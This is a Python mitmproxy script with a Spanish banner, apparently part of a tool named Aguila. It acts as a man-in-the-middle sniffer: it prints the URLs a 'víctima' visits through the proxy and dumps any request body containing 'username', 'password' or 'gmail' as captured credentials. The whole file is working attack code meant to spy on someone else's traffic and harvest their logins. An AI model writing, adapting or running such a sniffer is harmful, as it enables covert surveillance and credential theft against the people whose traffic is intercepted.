from mitmproxy import http
from urllib.parse import urlparse
import os
import signal
import sys

def salida(sig, frame):
    sys.exit(1)
    os.system('./Aguila.py')

signal.signal(signal.SIGINT, salida)

os.system('clear')
print('''
                      _ _                      _   _                _       
     /\              (_) |           /\       | | (_)              | |      
    /  \   __ _ _   _ _| | __ _     /  \   ___| |_ ___   ____ _  __| | __ _ 
   / /\ \ / _` | | | | | |/ _` |   / /\ \ / __| __| \ \ / / _` |/ _` |/ _` |
  / ____ \ (_| | |_| | | | (_| |  / ____ \ (__| |_| |\ V / (_| | (_| | (_| |
 /_/    \_\__, |\__,_|_|_|\__,_| /_/    \_\___|\__|_| \_/ \__,_|\__,_|\__,_|
           __/ |                                                            
          |___/                                                             
 
Si no aparece ninguna url es posible que el proxy este mal configurado o que la víctima no este navegando
''')

def has_keywords(data, keywords):
    if data is None:
        return False
    return any(keyword in data for keyword in keywords)

def contains_excluded_words(url, excluded_words):
    return any(word in url for word in excluded_words)

def response(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    schema = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    exclusion_palabras = ["google", "cloud", "bing", "static", "beacons", "fontawesome", "protechts", "video-weaver", "pdx01", "cookiebot", "dof6", "geolocation", "public", "img", "w3", "goog", "delivery", "events", "microsoft", "browser", "ajax", "api" ]

    if not contains_excluded_words(url, exclusion_palabras):
        print(f"[+] URL Víctima: {schema}://{domain}/{path}")

    keywords = ["username", "password", "gmail"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        # Divide el texto por espacios y revisa la longitud
        words = data.split()
        if len(words) > 20:
            data = ' '.join(words[:20])  # Solo muestra las primeras 20 palabras
        print(f"\n\n[+] Credenciales potenciales capturada:\n\n{data}\n\n")
